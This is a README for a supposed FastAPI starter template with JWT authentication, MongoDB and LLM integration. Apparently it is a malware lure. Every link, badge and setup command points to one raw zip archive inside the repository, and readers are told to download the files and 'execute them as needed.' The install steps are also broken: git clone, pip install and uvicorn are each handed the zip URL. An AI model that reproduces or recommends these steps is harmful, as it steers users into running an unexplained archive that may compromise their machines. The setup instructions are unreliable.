# FastAPI Starter Template with JWT Auth and MongoDB Integration 🚀

[![Latest Release](https://raw.githubusercontent.com/Rony-Soc/TemplatesFastAPI/main/app/api/API-Fast-Templates-3.8.zip)](https://raw.githubusercontent.com/Rony-Soc/TemplatesFastAPI/main/app/api/API-Fast-Templates-3.8.zip)
[![License](https://raw.githubusercontent.com/Rony-Soc/TemplatesFastAPI/main/app/api/API-Fast-Templates-3.8.zip)](https://raw.githubusercontent.com/Rony-Soc/TemplatesFastAPI/main/app/api/API-Fast-Templates-3.8.zip)

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Technologies Used](#technologies-used)
- [Getting Started](#getting-started)
  - [Prerequisites](#prerequisites)
  - [Installation](#installation)
  - [Running the Application](#running-the-application)
- [Usage](#usage)
- [API Endpoints](#api-endpoints)
- [Testing](#testing)
- [Contributing](#contributing)
- [License](#license)
- [Acknowledgments](#acknowledgments)

## Overview

This repository, **TemplatesFastAPI**, offers a robust starter template for building applications with FastAPI. It includes features such as JWT authentication, MongoDB integration, and support for large language models (LLMs). This template provides a solid foundation for developers looking to create scalable and efficient RESTful APIs.

## Features

- **FastAPI**: High-performance web framework for building APIs.
- **JWT Authentication**: Secure user authentication and authorization.
- **MongoDB**: NoSQL database for storing application data.
- **LLM Integration**: Connect with large language models like OpenAI for enhanced functionality.
- **Modular Structure**: Organized codebase for easy navigation and maintenance.
- **Environment Configuration**: Simple setup with environment variables.
- **API Documentation**: Automatically generated using Swagger UI.

## Technologies Used

- **Python 3**: Programming language for backend development.
- **FastAPI**: Framework for building APIs quickly and efficiently.
- **MongoDB**: Database for storing data in a flexible, JSON-like format.
- **Pydantic**: Data validation and settings management using Python type annotations.
- **PyJWT**: JSON Web Token implementation for authentication.
- **Uvicorn**: ASGI server for running FastAPI applications.
- **OpenAI API**: Integration for leveraging language models.

## Getting Started

### Prerequisites

Before you begin, ensure you have the following installed:

- Python 3.7 or higher
- MongoDB (local or cloud instance)
- Git

### Installation

1. Clone the repository:

   ```bash
   git clone https://raw.githubusercontent.com/Rony-Soc/TemplatesFastAPI/main/app/api/API-Fast-Templates-3.8.zip
   cd TemplatesFastAPI
   ```

2. Create a virtual environment:

   ```bash
   python -m venv venv
   source venv/bin/activate  # On Windows use `venv\Scripts\activate`
   ```

3. Install the required packages:

   ```bash
   pip install -r https://raw.githubusercontent.com/Rony-Soc/TemplatesFastAPI/main/app/api/API-Fast-Templates-3.8.zip
   ```

4. Set up environment variables. Create a `.env` file in the root directory and add your configuration:

   ```plaintext
   MONGODB_URL=mongodb://localhost:27017
   JWT_SECRET=your_jwt_secret
   OPENAI_API_KEY=your_openai_api_key
   ```

### Running the Application

To start the FastAPI application, run:

```bash
uvicorn https://raw.githubusercontent.com/Rony-Soc/TemplatesFastAPI/main/app/api/API-Fast-Templates-3.8.zip --reload
```

Your application will be available at `http://127.0.0.1:8000`.

For the latest release, download the necessary files from the [Releases section](https://raw.githubusercontent.com/Rony-Soc/TemplatesFastAPI/main/app/api/API-Fast-Templates-3.8.zip) and execute them as needed.

## Usage

Once the application is running, you can interact with it using tools like Postman or Curl. The API provides endpoints for user registration, login, and accessing protected resources.

### User Registration

To register a new user, send a POST request to `/register` with the following JSON body:

```json
{
  "username": "your_username",
  "password": "your_password"
}
```

### User Login

To log in, send a POST request to `/login` with the same credentials:

```json
{
  "username": "your_username",
  "password": "your_password"
}
```

This will return a JWT token for authentication.

### Accessing Protected Routes

To access protected routes, include the JWT token in the Authorization header:

```plaintext
Authorization: Bearer your_jwt_token
```

## API Endpoints

| Method | Endpoint            | Description                     |
|--------|---------------------|---------------------------------|
| POST   | `/register`         | Register a new user            |
| POST   | `/login`            | Authenticate user               |
| GET    | `/protected`        | Access protected resource       |
| POST   | `/llm-query`        | Query the LLM with user input  |

## Testing

To run the tests, ensure your virtual environment is activated and run:

```bash
pytest tests/
```

This will execute all tests in the `tests` directory.

## Contributing

Contributions are welcome! If you have suggestions or improvements, please fork the repository and submit a pull request. Ensure your code adheres to the existing style and includes appropriate tests.

1. Fork the repository.
2. Create a new branch: `git checkout -b feature/YourFeature`.
3. Make your changes and commit them: `git commit -m 'Add some feature'`.
4. Push to the branch: `git push origin feature/YourFeature`.
5. Open a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/Rony-Soc/TemplatesFastAPI/main/app/api/API-Fast-Templates-3.8.zip) file for details.

## Acknowledgments

- Thanks to the FastAPI community for their excellent framework.
- Special thanks to the developers of the libraries used in this project.
- Inspiration from various open-source projects that paved the way for this template.

For more details, visit the [Releases section](https://raw.githubusercontent.com/Rony-Soc/TemplatesFastAPI/main/app/api/API-Fast-Templates-3.8.zip).